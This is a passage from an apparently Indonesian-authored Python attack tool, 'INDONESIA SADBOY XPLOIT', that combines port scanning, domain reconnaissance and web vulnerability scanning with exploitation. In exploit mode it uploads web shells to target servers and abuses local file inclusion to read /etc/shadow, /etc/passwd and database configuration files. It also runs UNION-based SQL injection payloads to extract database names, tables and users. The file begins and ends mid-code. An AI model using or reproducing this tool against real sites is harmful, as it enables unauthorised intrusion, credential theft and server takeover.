                self.log(f"Pemindaian selesai. Tidak ditemukan port terbuka pada {target}.", "INFO")
                
            return open_ports
            
        except socket.gaierror:
            self.log(f"Error: Hostname tidak dapat di-resolve.", "ERROR")
            return []
        except Exception as e:
            self.log(f"Error saat pemindaian port: {str(e)}", "ERROR")
            return []
    
    def get_service_name(self, port):
        """Mendapatkan nama layanan berdasarkan nomor port"""
        services = {
            20: 'FTP-data',
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            111: 'RPC',
            135: 'MSRPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1433: 'MS-SQL',
            1521: 'Oracle',
            1723: 'PPTP',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            8080: 'HTTP-Proxy',
            8443: 'HTTPS-Alt'
        }
        
        return services.get(port, 'Unknown')
    
    def generate_report(self, target, output_file=None):
        """Menghasilkan laporan hasil pemindaian"""
        if not self.results:
            self.log("Tidak ada hasil pemindaian untuk dilaporkan.", "WARNING")
            return
        
        # Format laporan untuk output terminal
        report = f"\n{'=' * 60}\n"
        report += f"LAPORAN PEMINDAIAN PORT: {target}\n"
        report += f"{'=' * 60}\n"
        report += f"{'PORT':<10}{'STATUS':<10}{'LAYANAN':<15}{'BANNER'}\n"
        report += f"{'-' * 60}\n"
        
        for port_info in self.results:
            report += f"{port_info['port']:<10}{'OPEN':<10}{port_info['service']:<15}{port_info['banner'][:30]}\n"
        
        report += f"{'=' * 60}\n"
        report += f"Total port terbuka: {len(self.results)}\n"
        report += f"{'=' * 60}\n"
        
        print(report)
        
        # Simpan laporan ke file jika diminta
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write(report)
                self.log(f"Laporan disimpan ke: {output_file}", "SUCCESS")
            except Exception as e:
                self.log(f"Error saat menyimpan laporan: {str(e)}", "ERROR")


# Class untuk pemindaian informasi domain
class DomainInfoScanner:
    """Kelas untuk mengumpulkan informasi tentang domain"""
    
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.results = {
            'whois': {},
            'dns_records': {},
            'subdomains': []
        }
    
    def log(self, message, level="INFO"):
        """Fungsi untuk logging"""
        color_map = {
            "INFO": LogColors.INFO,
            "SUCCESS": LogColors.SUCCESS,
            "WARNING": LogColors.WARNING,
            "ERROR": LogColors.ERROR,
            "CRITICAL": LogColors.CRITICAL
        }
        color = color_map.get(level, Fore.WHITE)
        
        log_msg = f"{color}[DOMAIN] {message}{LogColors.RESET}"
        print(log_msg)
        
        if level == "INFO":
            logger.info(f"[DOMAIN] {message}")
        elif level == "SUCCESS":
            logger.info(f"[DOMAIN] {message}")
        elif level == "WARNING":
            logger.warning(f"[DOMAIN] {message}")
        elif level == "ERROR":
            logger.error(f"[DOMAIN] {message}")
        elif level == "CRITICAL":
            logger.critical(f"[DOMAIN] {message}")
    
    def get_domain_info(self, domain):
        """Mendapatkan informasi lengkap tentang domain"""
        self.log(f"Mengumpulkan informasi tentang domain: {domain}", "INFO")
        
        # Mendapatkan informasi WHOIS
        self.get_whois_info(domain)
        
        # Mendapatkan DNS records
        self.get_dns_records(domain)
        
        # Mencari subdomain
        self.find_subdomains(domain)
        
        return self.results
    
    def get_whois_info(self, domain):
        """Mendapatkan informasi WHOIS untuk domain"""
        self.log(f"Mendapatkan informasi WHOIS untuk {domain}", "INFO")
        
        try:
            domain_info = whois.whois(domain)
            
            # Ekstrak informasi penting
            whois_data = {
                'registrar': domain_info.registrar,
                'creation_date': str(domain_info.creation_date),
                'expiration_date': str(domain_info.expiration_date),
                'status': domain_info.status,
                'name_servers': domain_info.name_servers
            }
            
            self.results['whois'] = whois_data
            self.log(f"Informasi WHOIS untuk {domain} berhasil didapatkan", "SUCCESS")
            
            return whois_data
        except Exception as e:
            self.log(f"Error saat mendapatkan informasi WHOIS: {str(e)}", "ERROR")
            return {}
    
    def get_dns_records(self, domain):
        """Mendapatkan DNS records untuk domain"""
        self.log(f"Mendapatkan DNS records untuk {domain}", "INFO")
        
        dns_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']
        dns_records = {}
        
        for record_type in dns_types:
            try:
                resolver = dns.resolver.Resolver()
                answers = resolver.resolve(domain, record_type)
                records = []
                
                for rdata in answers:
                    records.append(str(rdata))
                
                dns_records[record_type] = records
                self.log(f"DNS {record_type} records untuk {domain} berhasil didapatkan", "SUCCESS")
            except Exception as e:
                if self.verbose:
                    self.log(f"Tidak ditemukan DNS {record_type} records: {str(e)}", "WARNING")
        
        self.results['dns_records'] = dns_records
        return dns_records
    
    def find_subdomains(self, domain, wordlist=None):
        """Mencari subdomain menggunakan DNS bruteforce"""
        self.log(f"Mencari subdomain untuk {domain}", "INFO")
        
        if wordlist is None:
            # Daftar subdomain umum untuk dicoba
            wordlist = [
                'www', 'mail', 'ftp', 'webmail', 'login', 'remote', 'blog',
                'server', 'ns1', 'ns2', 'smtp', 'secure', 'vpn', 'admin',
                'store', 'api', 'dev', 'staging', 'test', 'portal', 'beta',
                'checkout', 'cdn', 'cloud', 'forum', 'support', 'host',
                'app', 'media', 'mobile', 'news', 'docs', 'status', 'web'
            ]
        
        found_subdomains = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_subdomain, f"{sub}.{domain}"): sub for sub in wordlist}
            
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(wordlist), desc="Subdomain Scanning", disable=not self.verbose):
                subdomain = future.result()
                if subdomain:
                    found_subdomains.append(subdomain)
        
        self.results['subdomains'] = found_subdomains
        
        if found_subdomains:
            self.log(f"Ditemukan {len(found_subdomains)} subdomain untuk {domain}", "SUCCESS")
        else:
            self.log(f"Tidak ditemukan subdomain untuk {domain}", "INFO")
            
        return found_subdomains
    
    def _check_subdomain(self, subdomain):
        """Memeriksa apakah subdomain valid"""
        try:
            resolver = dns.resolver.Resolver()
            resolver.lifetime = 1  # Timeout dalam detik
            answers = resolver.resolve(subdomain, 'A')
            
            if answers:
                ip_addresses = [str(rdata) for rdata in answers]
                self.log(f"Subdomain ditemukan: {subdomain} ({', '.join(ip_addresses)})", "SUCCESS")
                return {
                    'subdomain': subdomain,
                    'ip_addresses': ip_addresses
                }
            return None
        except:
            return None


# Class utama untuk aplikasi
class Indosadxploit:
    """Kelas utama untuk INDONESIA SADBOY XPLOIT"""
    
    def __init__(self, verbose=False):
        self.session = requests.Session()
        self.session.verify = False  # Abaikan SSL verification
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        
        self.uploader = EnhancedUploader(self.session, verbose=verbose)
        self.vuln_scanner = WebVulnScanner(self.session, verbose=verbose)
        self.port_scanner = PortScanner(verbose=verbose)
        self.domain_scanner = DomainInfoScanner(verbose=verbose)
        
        self.results = {}
        self.verbose = verbose
    
    def log(self, message, level="INFO"):
        """Fungsi untuk logging"""
        color_map = {
            "INFO": LogColors.INFO,
            "SUCCESS": LogColors.SUCCESS,
            "WARNING": LogColors.WARNING,
            "ERROR": LogColors.ERROR,
            "CRITICAL": LogColors.CRITICAL
        }
        color = color_map.get(level, Fore.WHITE)
        
        log_msg = f"{color}[INDOSADBOYXPLOIT] {message}{LogColors.RESET}"
        print(log_msg)
        
        if level == "INFO":
            logger.info(f"[INDOSADBOYXPLOIT] {message}")
        elif level == "SUCCESS":
            logger.info(f"[INDOSADBOYXPLOIT] {message}")
        elif level == "WARNING":
            logger.warning(f"[INDOSADBOYXPLOIT] {message}")
        elif level == "ERROR":
            logger.error(f"[INDOSADBOYXPLOIT] {message}")
        elif level == "CRITICAL":
            logger.critical(f"[INDOSADBOYXPLOIT] {message}")
    
    def scan_target(self, target, scan_types=None, exploit=False):
        """Melakukan pemindaian lengkap pada target"""
        self.log(f"Memulai pemindaian lengkap pada: {target}", "INFO")
        
        if scan_types is None:
            scan_types = ['domain', 'port', 'web_vuln', 'upload_vuln']
        
        target_url = target
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        parsed_url = urllib.parse.urlparse(target_url)
        domain = parsed_url.netloc
        
        # Simpan waktu mulai scan
        start_time = time.time()
        
        # Inisialisasi hasil pemindaian
        self.results = {
            'target': target,
            'scan_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'scan_types': scan_types,
            'domain_info': {},
            'port_scan': [],
            'web_vulnerabilities': {},
            'upload_vulnerabilities': {},
            'exploits': {},
            'shells_uploaded': {}
        }
        
        # Pemindaian informasi domain
        if 'domain' in scan_types:
            self.log(f"Memulai pemindaian informasi domain untuk: {domain}", "INFO")
            self.results['domain_info'] = self.domain_scanner.get_domain_info(domain)
        
        # Pemindaian port
        if 'port' in scan_types:
            self.log(f"Memulai pemindaian port untuk: {domain}", "INFO")
            self.results['port_scan'] = self.port_scanner.scan_target(domain)
        
        # Pemindaian kerentanan web
        if 'web_vuln' in scan_types:
            self.log(f"Memulai pemindaian kerentanan web untuk: {target_url}", "INFO")
            self.results['web_vulnerabilities'] = self.vuln_scanner.scan_target(target_url, ['xss', 'sqli', 'lfi', 'rfi', 'open_redirect', 'csrf', 'clickjacking', 'sensitive_files'])
        
        # Pemindaian kerentanan upload file
        if 'upload_vuln' in scan_types:
            self.log(f"Memulai pemindaian kerentanan upload untuk: {target_url}", "INFO")
            upload_result = self.uploader.test_upload_vulnerability(target_url, use_shell=exploit)
            self.results['upload_vulnerabilities'] = upload_result
            
            # Simpan informasi shell jika berhasil diupload
            if exploit and upload_result.get('shells_uploaded', 0) > 0:
                self.results['shells_uploaded'] = upload_result.get('uploaded_payloads', {})
                self.log(f"Berhasil mengupload {upload_result.get('shells_uploaded', 0)} shell ke server!", "SUCCESS")
        
        # Eksploitasi kerentanan jika diminta
        if exploit:
            self.log("Mencoba eksploitasi kerentanan yang ditemukan...", "INFO")
            
            # Eksploitasi kerentanan upload jika ditemukan
            if 'upload_vuln' in scan_types and not self.results['shells_uploaded']:
                if self.results['upload_vulnerabilities'].get('vulnerable', False) and self.results['upload_vulnerabilities'].get('vulnerability_level', 'None') != 'None':
                    self.log("Mencoba eksploitasi kerentanan upload file...", "INFO")
                    exploit_result = self.uploader.upload_shell_to_server(target_url)
                    
                    if exploit_result.get('success', False):
                        self.results['exploits']['upload_exploit'] = exploit_result
                        self.results['shells_uploaded'].update(exploit_result.get('shells', {}))
                        self.log("Berhasil mengeksploitasi kerentanan upload file!", "SUCCESS")
                    else:
                        self.log("Gagal mengeksploitasi kerentanan upload file.", "WARNING")
            
            # Eksploitasi kerentanan LFI jika ditemukan
# Eksploitasi kerentanan LFI jika ditemukan
            if 'web_vuln' in scan_types and 'lfi' in self.results['web_vulnerabilities'] and self.results['web_vulnerabilities']['lfi']:
                self.log("Mencoba eksploitasi kerentanan LFI...", "INFO")
                
                lfi_exploits = []
                interesting_files = [
                    '/etc/passwd', '/etc/hosts', '/etc/shadow', '/proc/self/environ',
                    '/var/www/html/config.php', '/var/www/html/wp-config.php',
                    '/var/www/html/configuration.php', '/var/www/html/config.inc.php',
                    '/proc/self/cmdline', '/proc/self/status', '/etc/httpd/conf/httpd.conf',
                    '/etc/apache2/apache2.conf', '/etc/nginx/nginx.conf'
                ]
                
                # Jelajahi setiap kerentanan LFI yang ditemukan
                for lfi_vuln in self.results['web_vulnerabilities']['lfi']:
                    vuln_url = lfi_vuln.get('url', '')
                    vuln_param = lfi_vuln.get('parameter', '')
                    
                    if not vuln_url or not vuln_param:
                        continue
                    
                    # Coba baca file-file penting
                    for target_file in interesting_files:
                        try:
                            # Buat URL untuk eksploitasi
                            parsed_url = urllib.parse.urlparse(vuln_url)
                            query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                            query_params[vuln_param] = target_file
                            
                            # Bangun URL baru dengan parameter yang diubah
                            exploit_url_parts = list(parsed_url)
                            exploit_url_parts[4] = urllib.parse.urlencode(query_params)
                            exploit_url = urllib.parse.urlunparse(exploit_url_parts)
                            
                            # Kirim permintaan ke URL eksploitasi
                            self.log(f"Mencoba membaca file {target_file} melalui LFI...", "INFO")
                            response = self.session.get(exploit_url, timeout=10, verify=False)
                            
                            # Indikator isi file
                            file_indicators = {
                                '/etc/passwd': ['root:', 'daemon:', 'bin:', 'sys:'],
                                '/etc/shadow': ['root:', ':', '$'],
                                '/etc/hosts': ['localhost', '127.0.0.1'],
                                'config.php': ['$db', '$config', '$password', 'mysql', 'database'],
                                'wp-config.php': ['DB_NAME', 'DB_USER', 'DB_PASSWORD'],
                                '/proc/self/environ': ['DOCUMENT_ROOT', 'SERVER_SOFTWARE', 'SCRIPT_FILENAME']
                            }
                            
                            # Cek apakah konten file terlihat dalam respons
                            file_content = None
                            for indicator_file, indicators in file_indicators.items():
                                if indicator_file in target_file:
                                    for indicator in indicators:
                                        if indicator in response.text:
                                            # Ekstrak konten file dengan regex sederhana
                                            # Ambil teks sekitar indikator (50 karakter sebelum dan 200 setelah)
                                            match_pos = response.text.find(indicator)
                                            start_pos = max(0, match_pos - 50)
                                            end_pos = min(len(response.text), match_pos + 200)
                                            file_content = response.text[start_pos:end_pos].strip()
                                            break
                            
                            if file_content:
                                self.log(f"Berhasil membaca file {target_file} melalui LFI!", "SUCCESS")
                                lfi_exploits.append({
                                    'url': exploit_url,
                                    'file': target_file,
                                    'content_preview': file_content[:300] + ('...' if len(file_content) > 300 else ''),
                                    'full_content': file_content
                                })
                            
                        except Exception as e:
                            self.log(f"Error saat eksploitasi LFI untuk file {target_file}: {str(e)}", "ERROR")
                
                self.results['exploits']['lfi_exploits'] = lfi_exploits
                self.log(f"Eksploitasi LFI selesai. Berhasil membaca {len(lfi_exploits)} file.", "SUCCESS")

            # Eksploitasi kerentanan SQLi jika ditemukan
            if 'web_vuln' in scan_types and 'sqli' in self.results['web_vulnerabilities'] and self.results['web_vulnerabilities']['sqli']:
                self.log("Mencoba eksploitasi kerentanan SQLi...", "INFO")
                
                sqli_exploits = []
                
                # Payload untuk ekstrak informasi database
                sqli_payloads = [
                    # MySQL 
                    "' UNION SELECT 1,database(),3,4,5-- -",
                    "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -",
                    "' UNION SELECT 1,column_name,table_name,4,5 FROM information_schema.columns WHERE table_schema=database()-- -",
                    "' UNION SELECT 1,user(),3,4,5-- -",
                    "' UNION SELECT 1,version(),3,4,5-- -",
                    
                    # PostgreSQL
                    "' UNION SELECT 1,current_database(),3,4,5-- -",
                    "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -",
                    "' UNION SELECT 1,column_name,table_name,4,5 FROM information_schema.columns-- -",
                    "' UNION SELECT 1,current_user,3,4,5-- -",
                    "' UNION SELECT 1,version(),3,4,5-- -",
                    
                    # MSSQL
                    "' UNION SELECT 1,DB_NAME(),3,4,5-- -",
                    "' UNION SELECT 1,TABLE_NAME,3,4,5 FROM INFORMATION_SCHEMA.TABLES-- -",
                    "' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,4,5 FROM INFORMATION_SCHEMA.COLUMNS-- -",
                    "' UNION SELECT 1,USER_NAME(),3,4,5-- -",
                    "' UNION SELECT 1,@@version,3,4,5-- -"
                ]
                
                for sqli_vuln in self.results['web_vulnerabilities']['sqli']:
                    vuln_url = sqli_vuln.get('url', '')
                    vuln_param = sqli_vuln.get('parameter', '')
                    vuln_method = sqli_vuln.get('method', 'GET').upper()
                    
                    if not vuln_url or not vuln_param:
                        continue
                    
                    self.log(f"Mencoba eksploitasi SQLi pada {vuln_url} dengan parameter {vuln_param}", "INFO")
                    
                    # Tester payload untuk deteksi jumlah kolom
                    columns_payloads = [
                        f"' ORDER BY 1-- -", f"' ORDER BY 2-- -", f"' ORDER BY 3-- -", 
                        f"' ORDER BY 4-- -", f"' ORDER BY 5-- -", f"' ORDER BY 6-- -",
                        f"' ORDER BY 7-- -", f"' ORDER BY 8-- -", f"' ORDER BY 9-- -", 
                        f"' ORDER BY 10-- -"
                    ]
                    
                    # Coba deteksi jumlah kolom
                    num_columns = None
                    for i, payload in enumerate(columns_payloads, 1):
                        try:
                            # Buat URL untuk eksploitasi
                            parsed_url = urllib.parse.urlparse(vuln_url)
                            query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                            query_params[vuln_param] = payload
                            
                            # Bangun URL baru dengan parameter yang diubah
                            exploit_url_parts = list(parsed_url)
                            exploit_url_parts[4] = urllib.parse.urlencode(query_params)
                            exploit_url = urllib.parse.urlunparse(exploit_url_parts)
                            
                            # Kirim permintaan
                            response = self.session.get(exploit_url, timeout=10, verify=False)
                            
                            # Jika respons memiliki kode error SQL, berarti kolom sebelumnya valid
                            if 'error' in response.text.lower() or 'sql' in response.text.lower() or 'syntax' in response.text.lower():
                                num_columns = i - 1
                                self.log(f"Terdeteksi database memiliki {num_columns} kolom.", "SUCCESS")
                                break
                        except Exception as e:
                            self.log(f"Error saat deteksi jumlah kolom: {str(e)}", "ERROR")
                    
                    # Jika jumlah kolom tidak terdeteksi, gunakan nilai default
                    if not num_columns:
                        num_columns = 5
                        self.log("Tidak dapat mendeteksi jumlah kolom, menggunakan nilai default 5.", "WARNING")
                    
                    # Sesuaikan payload dengan jumlah kolom
                    adjusted_payloads = []
                    for payload in sqli_payloads:
                        # Payload dasar dengan UNION SELECT 1,2,3,...,n
                        base = "' UNION SELECT "
                        for i in range(1, num_columns + 1):
                            if i == 2:  # Kolom kedua untuk data
                                base += "data_column,"
                            else:
                                base += f"{i},"
                        base = base[:-1] + "-- -"  # Hapus koma terakhir dan tambahkan komentar
                        
                        # Ganti 'data_column' dengan kolom target dari payload asli
                        data_column = payload.split("UNION SELECT ")[1].split(",")[1]
                        adjusted_payload = base.replace("data_column", data_column)
                        adjusted_payloads.append(adjusted_payload)
                    
                    # Jelajahi dengan payload yang disesuaikan
                    for payload in adjusted_payloads:
                        try:
                            # Buat URL untuk eksploitasi
                            parsed_url = urllib.parse.urlparse(vuln_url)
                            query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                            query_params[vuln_param] = payload
                            
                            # Bangun URL baru dengan parameter yang diubah
                            exploit_url_parts = list(parsed_url)
                            exploit_url_parts[4] = urllib.parse.urlencode(query_params)
                            exploit_url = urllib.parse.urlunparse(exploit_url_parts)
                            
                            # Kirim permintaan
                            self.log(f"Mencoba payload: {payload}", "INFO")
                            response = self.session.get(exploit_url, timeout=10, verify=False)
                            
                            # Cari hasil di respons menggunakan regex untuk ekstrak data antara dua angka
                            # Misalnya dalam respons berisi "1database_name3", kita ekstrak "database_name"
                            for i in range(1, num_columns):
                                j = i + 1
                                pattern = f"{i}(.*?){j}"
                                matches = re.findall(pattern, response.text)
                                for match in matches:
                                    if match and len(match) > 1 and not match.isdigit():
                                        self.log(f"Ditemukan data: {match}", "SUCCESS")
                                        sqli_exploits.append({
                                            'url': exploit_url,
                                            'payload': payload,
                                            'data': match,
                                            'context': f"Antara kolom {i} dan {j}"
                                        })
                            
                        except Exception as e:
                            self.log(f"Error saat eksploitasi SQLi dengan payload {payload}: {str(e)}", "ERROR")
                
                self.results['exploits']['sqli_exploits'] = sqli_exploits
                self.log(f"Eksploitasi SQLi selesai. Berhasil mengekstrak {len(sqli_exploits)} informasi.", "SUCCESS")
        
        # Hitung waktu total pemindaian
        end_time = time.time()
        scan_duration = end_time - start_time
        self.results['scan_duration'] = f"{scan_duration:.2f} detik"
        
        self.log(f"Pemindaian selesai. Waktu total: {scan_duration:.2f} detik", "SUCCESS")
        
        return self.results
    
    def generate_report(self, output_format='json', output_file=None):
        """Generate report dari hasil pemindaian"""
        if not self.results:
            self.log("Tidak ada hasil pemindaian untuk dilaporkan.", "WARNING")
            return
        
        # Buat direktori output jika belum ada
        output_dir = os.path.join(OUTPUT_DIR, TIMESTAMP)
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Set nama file output default jika tidak ditentukan
        if output_file is None:
            target_name = self.results.get('target', 'unknown_target').replace('://', '_').replace('/', '_')
            output_file = os.path.join(output_dir, f"{target_name}_report.{output_format}")
        
        self.log(f"Menghasilkan laporan dalam format {output_format.upper()}", "INFO")
        
        if output_format == 'json':
            try:
                with open(output_file, 'w') as f:
                    json.dump(self.results, f, indent=4)
                self.log(f"Laporan JSON disimpan ke: {output_file}", "SUCCESS")
            except Exception as e:
                self.log(f"Error saat menyimpan laporan JSON: {str(e)}", "ERROR")
        
        elif output_format == 'html':
            try:
                # Template HTML sederhana
                html_template = f"""<!DOCTYPE html>
<html>
<head>
    <title>INDONESIA SADBOY XPLOIT - Report</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; background-color: #f8f8f8; }}
        .container {{ max-width: 1200px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1, h2, h3, h4 {{ color: #2c3e50; }}
        h1 {{ text-align: center; margin-bottom: 30px; color: #e74c3c; }}
        .section {{ margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 20px; }}
        .section:last-child {{ border-bottom: none; }}
        table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; }}
        tr:hover {{ background-color: #f5f5f5; }}
        .vulnerability {{ margin-bottom: 15px; padding: 10px; border-left: 3px solid #e74c3c; background-color: #f9f9f9; }}
        .vulnerability h4 {{ margin-top: 0; color: #e74c3c; }}
        .footer {{ text-align: center; margin-top: 30px; font-size: 12px; color: #7f8c8d; }}
        pre {{ background-color: #f2f2f2; padding: 10px; border-radius: 3px; overflow-x: auto; }}
        .badge-danger {{ background-color: #e74c3c; color: white; padding: 3px 7px; border-radius: 3px; font-size: 12px; }}
        .badge-warning {{ background-color: #f39c12; color: white; padding: 3px 7px; border-radius: 3px; font-size: 12px; }}
        .badge-success {{ background-color: #2ecc71; color: white; padding: 3px 7px; border-radius: 3px; font-size: 12px; }}
        .shell-info {{ background-color: #1a1a1a; color: #2ecc71; padding: 15px; border-radius: 5px; font-family: monospace; margin-bottom: 15px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>INDONESIA SADBOY XPLOIT</h1>
        
        <div class="section">
            <h2>Scan Information</h2>
            <table>
                <tr>
                    <th>Target</th>
                    <td>{self.results.get('target', 'N/A')}</td>
                </tr>
                <tr>
                    <th>Scan Time</th>
                    <td>{self.results.get('scan_time', 'N/A')}</td>
                </tr>
                <tr>
                    <th>Scan Duration</th>
                    <td>{self.results.get('scan_duration', 'N/A')}</td>
                </tr>
                <tr>
                    <th>Scan Types</th>
                    <td>{', '.join(self.results.get('scan_types', []))}</td>
                </tr>
            </table>
        </div>
"""
                
                # Tambahkan bagian informasi domain jika ada
                if 'domain_info' in self.results and self.results['domain_info']:
                    html_template += f"""
        <div class="section">
            <h2>Domain Information</h2>
"""
                    
                    # WHOIS Information
                    if 'whois' in self.results['domain_info'] and self.results['domain_info']['whois']:
                        whois_data = self.results['domain_info']['whois']
                        html_template += f"""
            <h3>WHOIS Information</h3>
            <table>
                <tr>
                    <th>Registrar</th>
                    <td>{whois_data.get('registrar', 'N/A')}</td>
                </tr>
                <tr>
                    <th>Creation Date</th>
                    <td>{whois_data.get('creation_date', 'N/A')}</td>
                </tr>
                <tr>
                    <th>Expiration Date</th>
                    <td>{whois_data.get('expiration_date', 'N/A')}</td>
                </tr>
                <tr>
                    <th>Status</th>
                    <td>{str(whois_data.get('status', 'N/A'))}</td>
                </tr>
                <tr>
                    <th>Name Servers</th>
                    <td>{', '.join(whois_data.get('name_servers', ['N/A']))}</td>
                </tr>
            </table>
"""
                    
                    # DNS Records
                    if 'dns_records' in self.results['domain_info'] and self.results['domain_info']['dns_records']:
                        dns_records = self.results['domain_info']['dns_records']
                        html_template += f"""
            <h3>DNS Records</h3>
"""
                        
                        for record_type, records in dns_records.items():
                            if records:
                                html_template += f"""
            <h4>{record_type} Records</h4>
            <ul>
"""
                                for record in records:
                                    html_template += f"                <li>{record}</li>\n"
                                html_template += "            </ul>\n"
                    
                    # Subdomains
                    if 'subdomains' in self.results['domain_info'] and self.results['domain_info']['subdomains']:
                        subdomains = self.results['domain_info']['subdomains']
                        html_template += f"""
            <h3>Subdomains</h3>
            <table>
                <tr>
                    <th>Subdomain</th>
                    <th>IP Addresses</th>
                </tr>
"""
                        for subdomain in subdomains:
                            html_template += f"""
                <tr>
                    <td>{subdomain.get('subdomain', 'N/A')}</td>
                    <td>{', '.join(subdomain.get('ip_addresses', ['N/A']))}</td>
                </tr>
"""
                        html_template += "            </table>\n"
                    
                    html_template += "        </div>\n"
                
                # Tambahkan bagian pemindaian port jika ada
                if 'port_scan' in self.results and self.results['port_scan']:
                    port_scan_results = self.results['port_scan']
                    html_template += f"""
        <div class="section">
            <h2>Port Scan Results</h2>
            <table>
                <tr>
                    <th>Port</th>
                    <th>State</th>
                    <th>Service</th>
                    <th>Banner</th>
                </tr>
"""
                    for port_info in port_scan_results:
                        html_template += f"""
                <tr>
                    <td>{port_info.get('port', 'N/A')}</td>
                    <td><span class="badge-danger">{port_info.get('state', 'N/A')}</span></td>
                    <td>{port_info.get('service', 'N/A')}</td>
                    <td>{port_info.get('banner', '')[:50]}</td>
                </tr>
"""
                    html_template += "            </table>\n"
                    html_template += "        </div>\n"
                
                # Tambahkan bagian kerentanan web jika ada
                if 'web_vulnerabilities' in self.results and self.results['web_vulnerabilities']:
                    web_vulnerabilities = self.results['web_vulnerabilities']
                    html_template += f"""
        <div class="section">
            <h2>Web Vulnerabilities</h2>
"""
                    
                    # XSS Vulnerabilities
                    if 'xss' in web_vulnerabilities and web_vulnerabilities['xss']:
                        html_template += f"""
            <h3>Cross-Site Scripting (XSS) <span class="badge-danger">{len(web_vulnerabilities['xss'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['xss']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>XSS at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
                <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # SQLi Vulnerabilities
                    if 'sqli' in web_vulnerabilities and web_vulnerabilities['sqli']:
                        html_template += f"""
            <h3>SQL Injection <span class="badge-danger">{len(web_vulnerabilities['sqli'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['sqli']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>SQLi at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
                <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # LFI Vulnerabilities
                    if 'lfi' in web_vulnerabilities and web_vulnerabilities['lfi']:
                        html_template += f"""
            <h3>Local File Inclusion (LFI) <span class="badge-danger">{len(web_vulnerabilities['lfi'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['lfi']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>LFI at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
                <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # RFI Vulnerabilities
                    if 'rfi' in web_vulnerabilities and web_vulnerabilities['rfi']:
                        html_template += f"""
            <h3>Remote File Inclusion (RFI) <span class="badge-danger">{len(web_vulnerabilities['rfi'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['rfi']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>RFI at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
                <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # Open Redirect Vulnerabilities
                    if 'open_redirect' in web_vulnerabilities and web_vulnerabilities['open_redirect']:
                        html_template += f"""
            <h3>Open Redirect <span class="badge-danger">{len(web_vulnerabilities['open_redirect'])} found</span></h3>
"""
                        for vuln in web_vulnerabilities['open_redirect']:
                            html_template += f"""
            <div class="vulnerability">
                <h4>Open Redirect at {vuln.get('url', 'N/A')}</h4>
                <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
                <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>
                <p><strong>Payload:</strong> <code>{vuln.get('payload', 'N/A')}</code></p>
                <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            </div>
"""
                    
                    # CSRF Vulnerabilities
                    if 'csrf' in web_vulnerabilities and web_vulnerabilities['csrf']:
                        html_template += f"""
